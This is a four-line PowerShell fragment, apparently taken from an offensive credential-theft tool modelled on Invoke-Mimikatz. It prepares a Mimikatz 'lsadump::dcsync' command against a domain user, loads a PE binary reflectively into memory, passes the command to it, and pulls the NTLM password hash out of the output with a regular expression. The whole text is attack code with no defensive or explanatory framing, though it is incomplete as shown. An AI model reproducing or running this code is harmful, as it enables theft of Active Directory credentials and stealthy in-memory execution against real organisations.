$command = "lsadump::dcsync /user:DOMAIN\user"
$PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes
$CommandPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($command)
if ($Output -match "Hash NTLM: (.+)") { $hash = $matches[1] }
